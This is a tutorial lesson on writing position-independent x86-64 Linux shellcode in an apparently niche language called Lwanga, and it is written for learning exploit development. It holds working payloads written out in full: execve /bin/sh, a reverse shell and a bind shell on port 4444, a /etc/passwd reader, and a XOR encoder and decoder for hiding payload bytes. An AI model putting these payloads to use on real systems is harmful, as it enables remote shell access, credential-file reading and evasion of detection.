# Lesson 30: Shellcode Basics

**In this lesson, you'll learn how to write position-independent shellcode for exploit development and security research.**

---

## What is Shellcode?

Shellcode is small, self-contained machine code that can execute anywhere in memory. Originally used to spawn shells, now refers to any injectable code.

**Characteristics:**
- Position-independent (works at any address)
- Self-contained (no external dependencies)
- Small size (often under 100 bytes)
- No null bytes (for string injection)
- Direct syscalls (no libc)

**Uses:**
- Exploit development
- Buffer overflow attacks
- Code injection
- Return-oriented programming (ROP)
- Security research

---

## Simple Shellcode: Exit

```lwanga
naked fn exit_shellcode() -> u64 {
    asm {
        mov rax, 60      // sys_exit
        xor rdi, rdi     // status = 0
        syscall
    }
}

fn main() -> u64 {
    exit_shellcode();
    return 0;  // Never reached
}
```

**Opcodes:**
```
48 c7 c0 3c 00 00 00    mov rax, 60
48 31 ff                xor rdi, rdi
0f 05                   syscall
```

**Size:** 12 bytes

---

## Shellcode: Execute /bin/sh

```lwanga
naked fn execve_shellcode() -> u64 {
    asm {
        // execve("/bin/sh", NULL, NULL)
        xor rax, rax            // Clear rax
        push rax                // Push NULL terminator
        mov rdi, 0x68732f6e69622f  // "/bin/sh" reversed
        push rdi                // Push string onto stack
        mov rdi, rsp            // rdi = pointer to "/bin/sh"
        xor rsi, rsi            // argv = NULL
        xor rdx, rdx            // envp = NULL
        mov rax, 59             // sys_execve
        syscall
    }
}

fn main() -> u64 {
    execve_shellcode();
    return 0;
}
```

**How it works:**
1. Clear rax and push NULL (string terminator)
2. Push "/bin/sh" string onto stack
3. Point rdi to the string
4. Set argv and envp to NULL
5. Call execve syscall

**Why this encoding?**
- `/bin/sh` = 0x2f62696e2f7368
- Reversed for little-endian: 0x68732f6e69622f
- Fits in one 64-bit register

---

## Position-Independent Code (PIC)

### Problem: Absolute Addresses

```lwanga
// BAD: Uses absolute address
naked fn bad_shellcode() -> u64 {
    asm {
        mov rdi, 0x400000    // Hardcoded address!
        syscall
    }
}
```

This only works if loaded at 0x400000.

### Solution: Relative Addressing

```lwanga
naked fn pic_shellcode() -> u64 {
    asm {
        jmp get_string
    do_call:
        pop rdi              // Get string address from stack
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
    get_string:
        call do_call
        .ascii "/bin/sh\0"
    }
}
```

**How it works:**
1. Jump to `get_string`
2. `call do_call` pushes return address (string location) onto stack
3. `pop rdi` gets string address
4. Execute syscall

This works at any memory address!

---

## Avoiding Null Bytes

### Why Avoid Nulls?

Null bytes (0x00) terminate strings in C. If injecting via strcpy or similar, null bytes stop copying.

### Bad: Contains Nulls

```lwanga
naked fn bad_shellcode() -> u64 {
    asm {
        mov rax, 0           // 48 c7 c0 00 00 00 00 (nulls!)
        mov rdi, 0           // 48 c7 c7 00 00 00 00 (nulls!)
        syscall
    }
}
```

### Good: No Nulls

```lwanga
naked fn good_shellcode() -> u64 {
    asm {
        xor rax, rax         // 48 31 c0 (no nulls)
        xor rdi, rdi         // 48 31 ff (no nulls)
        syscall
    }
}
```

**Techniques:**
- Use `xor reg, reg` instead of `mov reg, 0`
- Use `push` and `pop` for small values
- Use `lea` for address calculation
- Use smaller registers when possible

---

## Practical Shellcode Examples

### Example 1: Read-Write-Execute Shellcode

```lwanga
naked fn rwx_shellcode() -> u64 {
    asm {
        // write(1, "Hello\n", 6)
        xor rax, rax
        mov al, 1            // sys_write
        xor rdi, rdi
        mov dil, 1           // stdout
        lea rsi, [rip + msg]
        xor rdx, rdx
        mov dl, 6            // length
        syscall
        
        // exit(0)
        xor rax, rax
        mov al, 60           // sys_exit
        xor rdi, rdi
        syscall
        
    msg:
        .ascii "Hello\n"
    }
}

fn main() -> u64 {
    rwx_shellcode();
    return 0;
}
```

### Example 2: Reverse Shell Shellcode

```lwanga
naked fn reverse_shell() -> u64 {
    asm {
        // socket(AF_INET, SOCK_STREAM, 0)
        xor rax, rax
        mov al, 41           // sys_socket
        xor rdi, rdi
        mov dil, 2           // AF_INET
        xor rsi, rsi
        mov sil, 1           // SOCK_STREAM
        xor rdx, rdx
        syscall
        mov rdi, rax         // Save socket fd
        
        // connect(sockfd, &addr, 16)
        xor rax, rax
        mov al, 42           // sys_connect
        // Setup sockaddr_in on stack
        xor rsi, rsi
        push rsi             // sin_addr = 0.0.0.0
        push word 0x5c11     // sin_port = 4444 (htons)
        push word 0x02       // sin_family = AF_INET
        mov rsi, rsp
        xor rdx, rdx
        mov dl, 16
        syscall
        
        // dup2(sockfd, 0/1/2)
        xor rsi, rsi
    dup_loop:
        xor rax, rax
        mov al, 33           // sys_dup2
        syscall
        inc rsi
        cmp sil, 3
        jne dup_loop
        
        // execve("/bin/sh", NULL, NULL)
        xor rax, rax
        push rax
        mov rdi, 0x68732f6e69622f
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov al, 59
        syscall
    }
}
```

### Example 3: Port Binding Shellcode

```lwanga
naked fn bind_shell() -> u64 {
    asm {
        // socket(AF_INET, SOCK_STREAM, 0)
        xor rax, rax
        mov al, 41
        xor rdi, rdi
        mov dil, 2
        xor rsi, rsi
        mov sil, 1
        xor rdx, rdx
        syscall
        mov rdi, rax         // Save sockfd
        
        // bind(sockfd, &addr, 16)
        xor rax, rax
        mov al, 49           // sys_bind
        xor rsi, rsi
        push rsi             // sin_addr = 0.0.0.0
        push word 0x5c11     // sin_port = 4444
        push word 0x02       // sin_family = AF_INET
        mov rsi, rsp
        xor rdx, rdx
        mov dl, 16
        syscall
        
        // listen(sockfd, 1)
        xor rax, rax
        mov al, 50           // sys_listen
        xor rsi, rsi
        mov sil, 1
        syscall
        
        // accept(sockfd, NULL, NULL)
        xor rax, rax
        mov al, 43           // sys_accept
        xor rsi, rsi
        xor rdx, rdx
        syscall
        mov rdi, rax         // New client fd
        
        // dup2 and execve (same as reverse shell)
        // ...
    }
}
```

### Example 4: File Read Shellcode

```lwanga
naked fn read_file_shellcode() -> u64 {
    asm {
        // open("/etc/passwd", O_RDONLY)
        xor rax, rax
        mov al, 2            // sys_open
        lea rdi, [rip + filename]
        xor rsi, rsi         // O_RDONLY
        syscall
        mov rdi, rax         // Save fd
        
        // read(fd, buf, 4096)
        xor rax, rax         // sys_read
        lea rsi, [rip + buffer]
        mov rdx, 4096
        syscall
        mov rdx, rax         // Save bytes read
        
        // write(1, buf, bytes_read)
        xor rax, rax
        mov al, 1            // sys_write
        xor rdi, rdi
        mov dil, 1           // stdout
        lea rsi, [rip + buffer]
        syscall
        
        // exit(0)
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall
        
    filename:
        .ascii "/etc/passwd\0"
    buffer:
        .space 4096
    }
}
```

---

## Shellcode Encoding

### XOR Encoding

```lwanga
fn encode_shellcode(shellcode: ptr, len: u64, key: u8) -> u64 {
    let mut i: u64 = 0;
    
    unsafe {
        while i < len {
            let byte_ptr: ptr = (shellcode as u64 + i) as ptr;
            let byte: u8 = *(byte_ptr as ptr);
            *(byte_ptr as ptr) = byte ^ key;
            i = i + 1;
        }
    }
    
    return 0;
}

naked fn decoder_stub() -> u64 {
    asm {
        lea rsi, [rip + encoded_shellcode]
        xor rcx, rcx
        mov cl, 50           // Length
        xor rax, rax
        mov al, 0x42         // XOR key
    decode_loop:
        xor byte ptr [rsi], al
        inc rsi
        loop decode_loop
        
        // Jump to decoded shellcode
        lea rax, [rip + encoded_shellcode]
        jmp rax
        
    encoded_shellcode:
        .byte 0x00, 0x00, 0x00  // Encoded bytes here
    }
}
```

---

## Testing Shellcode

### Method 1: Direct Execution

```lwanga
fn main() -> u64 {
    execve_shellcode();
    return 0;
}
```

### Method 2: Function Pointer

```lwanga
fn test_shellcode(shellcode: ptr) -> u64 {
    unsafe {
        let func: fn() -> u64 = shellcode as fn() -> u64;
        return func();
    }
}

fn main() -> u64 {
    return test_shellcode(execve_shellcode as ptr);
}
```

### Method 3: Extracting Bytes

```bash
# Compile
lwangac shellcode.lwanga -o shellcode --pic

# Extract shellcode bytes
objcopy -O binary -j .text shellcode shellcode.bin

# View as hex
hexdump -v -e '"\\\x" 1/1 "%02x"' shellcode.bin

# Output: \x48\x31\xc0\x50\x48\xbf\x2f...
```

---

## Common Mistakes

### Mistake 1: Using Null Bytes

```lwanga
// WRONG: Contains nulls
naked fn bad() -> u64 {
    asm {
        mov rax, 0       // Has null bytes!
    }
}
```

**Fix:**
```lwanga
naked fn good() -> u64 {
    asm {
        xor rax, rax     // No null bytes
    }
}
```

### Mistake 2: Absolute Addresses

```lwanga
// WRONG: Not position-independent
naked fn bad() -> u64 {
    asm {
        mov rdi, 0x400000
    }
}
```

**Fix:**
```lwanga
naked fn good() -> u64 {
    asm {
        lea rdi, [rip + data]
    data:
        .ascii "test"
    }
}
```

### Mistake 3: Forgetting String Terminator

```lwanga
// WRONG: No null terminator
asm {
    .ascii "/bin/sh"     // Missing \0
}
```

**Fix:**
```lwanga
asm {
    .ascii "/bin/sh\0"   // With null terminator
}
```

---

## Exercises

### Exercise 1: Write "PWN\n" Shellcode

Write shellcode that prints "PWN\n" and exits.

<details>
<summary>Solution</summary>

```lwanga
naked fn pwn_shellcode() -> u64 {
    asm {
        xor rax, rax
        mov al, 1
        xor rdi, rdi
        mov dil, 1
        lea rsi, [rip + msg]
        xor rdx, rdx
        mov dl, 4
        syscall
        
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall
        
    msg:
        .ascii "PWN\n"
    }
}

fn main() -> u64 {
    pwn_shellcode();
    return 0;
}
```
</details>

### Exercise 2: Null-Free Exit

Write exit(0) shellcode with no null bytes.

<details>
<summary>Solution</summary>

```lwanga
naked fn nullfree_exit() -> u64 {
    asm {
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall
    }
}

fn main() -> u64 {
    nullfree_exit();
    return 0;
}
```
</details>

### Exercise 3: Calculate Shellcode Size

Write code to calculate shellcode size.

<details>
<summary>Solution</summary>

```lwanga
fn shellcode_size() -> u64 {
    let start: ptr = execve_shellcode as ptr;
    let end: ptr = after_shellcode as ptr;
    
    let size: u64 = (end as u64) - (start as u64);
    return size;
}

naked fn execve_shellcode() -> u64 {
    asm {
        xor rax, rax
        push rax
        mov rdi, 0x68732f6e69622f
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
    }
}

naked fn after_shellcode() -> u64 {
    asm {
        ret
    }
}

fn main() -> u64 {
    return shellcode_size();
}
```
</details>

### Exercise 4: XOR Encoder

Encode shellcode with XOR.

<details>
<summary>Solution</summary>

```lwanga
fn xor_encode(data: ptr, len: u64, key: u8) -> u64 {
    let mut i: u64 = 0;
    
    unsafe {
        while i < len {
            let ptr: ptr = (data as u64 + i) as ptr;
            let byte: u8 = *(ptr as ptr);
            *(ptr as ptr) = byte ^ key;
            i = i + 1;
        }
    }
    
    return 0;
}

fn main() -> u64 {
    let mut shellcode: [u8; 10] = [0x48, 0x31, 0xc0, 0x48, 0x31, 
                                    0xff, 0x0f, 0x05, 0x00, 0x00];
    
    xor_encode(&shellcode, 8, 0x42);
    
    return shellcode[0] as u64;
}
```
</details>

### Exercise 5: Shellcode Tester

Test if shellcode contains null bytes.

<details>
<summary>Solution</summary>

```lwanga
fn has_null_bytes(shellcode: ptr, len: u64) -> u64 {
    let mut i: u64 = 0;
    
    unsafe {
        while i < len {
            let byte_ptr: ptr = (shellcode as u64 + i) as ptr;
            let byte: u8 = *(byte_ptr as ptr);
            
            if byte == 0 {
                return 1;  // Has null byte
            }
            
            i = i + 1;
        }
    }
    
    return 0;  // No null bytes
}

fn main() -> u64 {
    let shellcode: [u8; 5] = [0x48, 0x31, 0xc0, 0x00, 0x05];
    return has_null_bytes(&shellcode, 5);  // Returns 1
}
```
</details>

---

## Key Takeaways

In this lesson, you learned:

- ✅ What shellcode is and its characteristics
- ✅ Writing simple shellcode (exit, execve)
- ✅ Position-independent code techniques
- ✅ Avoiding null bytes
- ✅ Practical shellcode examples (reverse shell, bind shell)
- ✅ Shellcode encoding (XOR)
- ✅ Testing and extracting shellcode
- ✅ Common mistakes and how to avoid them

---

## Next Lesson

Now that you understand shellcode, let's learn about code obfuscation in [Lesson 31: Code Obfuscation](31-obfuscation.md).

---

**Navigation**: [← Previous: Encrypted Strings](29-encrypted-strings.md) | [Tutorial Home](README.md) | [Next: Obfuscation →](31-obfuscation.md)
